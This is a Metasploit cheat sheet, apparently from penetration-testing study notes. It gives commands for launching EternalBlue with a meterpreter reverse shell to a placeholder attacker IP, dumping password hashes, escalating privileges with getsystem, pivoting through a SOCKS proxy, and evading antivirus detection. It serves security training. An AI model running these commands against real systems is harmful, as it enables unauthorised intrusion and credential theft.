# Metasploit

!!! tip ""
    Use Metasploit when the exploit module matches the exact target version, you need a stable meterpreter session for post-exploitation, or you need built-in pivoting. Go manual when OSCP rules apply, AV detects the payload, or you need a one-shot exploit without handler overhead.

!!! warning "Watch out"
    Meterpreter is heavily signatured. On hardened targets, use the `shell` stage instead, or generate a custom payload with MSFVenom and a custom encoder.

---

## Starting Metasploit

```bash
msfconsole
msfupdate
```

---

## Searching for Exploits

```bash
search smb
search type:exploit platform:windows
search cve:2021-44228
```

---

## Using an Exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.10.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
exploit
```

---

## Handling Sessions

```bash
sessions -l                  # list all sessions
sessions -i <session-id>     # interact with session
```

Background a session: `Ctrl+Z`

---

## Meterpreter Commands

```bash
sysinfo
getuid
hashdump
shell
upload /local/file C:\\remote\\path
download C:\\remote\\file /local/path
```

---

## Privilege Escalation

```bash
getprivs
run post/windows/escalate/getsystem
```

---

## Pivoting with Metasploit

```bash
use auxiliary/server/socks4a
set SRVPORT 1080
exploit
```

Add to `/etc/proxychains.conf`:

```
socks4 127.0.0.1 1080
```

```bash
proxychains nmap -sT -Pn 10.10.10.10
```

---

## Automating with Resource Scripts

```bash
msfconsole -r handler.rc
```

See the [Metasploit Resource Scripts](metasploit-resource-scripts.md) page for `.rc` file examples.
